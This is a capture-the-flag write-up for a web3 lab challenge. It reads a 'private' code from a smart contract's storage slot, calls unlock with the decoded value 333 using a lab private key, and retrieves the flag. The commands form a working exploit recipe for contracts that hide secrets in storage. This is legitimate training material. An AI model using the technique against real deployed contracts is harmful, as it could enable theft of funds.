# 🚀 **Challenge Writeup: Unlocking the Contract** 🔓  

### ✅ **Step 1: Setting Up Environment Variables**  
First, we set up the necessary environment variables to interact with the blockchain:  

```
export RPC_URL=http://10.10.109.18:8545  
export API_URL=http://10.10.109.18  
export PRIVATE_KEY=0xd82c93cb341c01fbc08feffb5c30a5b1a3f521c9811977a7f28353dab39824b0  
export CONTRACT_ADDRESS=0xf22cB0Ca047e88AC996c17683Cee290518093574
```    

🔧 This configuration allows us to interact with the remote blockchain contract.

---

### 🔍 **Step 2: Reading the Code Variable**  
Next, we read the value of the **private code variable** from **storage slot 2** using the `cast storage` command:  

```bash
cast storage $CONTRACT_ADDRESS 2 --rpc-url $RPC_URL  
```

🎯 **Output:**  
The command returned the following value:  
```bash
0x000000000000000000000000000000000000000000000000000000000000014d  
```

This corresponds to **333** in decimal.

---

### 🔓 **Step 3: Unlocking the Contract**  
We then called the `unlock` function with the correct code value (333) using `cast send`:  

```bash
cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --private-key $PRIVATE_KEY --rpc-url $RPC_URL --legacy  
```

⚠️ The `--legacy` flag was used to bypass the **EIP-1559 unsupported feature error**.

---

### 🔁 **Step 4: Verifying if the Contract is Solved**  
We checked if the `isSolved()` function returned `true`:  

```bash
cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL  
```

---

### 🏁 **Step 5: Retrieving the Flag**  
Finally, we retrieved the flag using the API endpoint:  

```bash
curl $API_URL/challenge/solve  
```  

🎉 **The flag was returned as:**  
```json
{"flag":"THM{web3_h4ck1ng_code}"}  
```
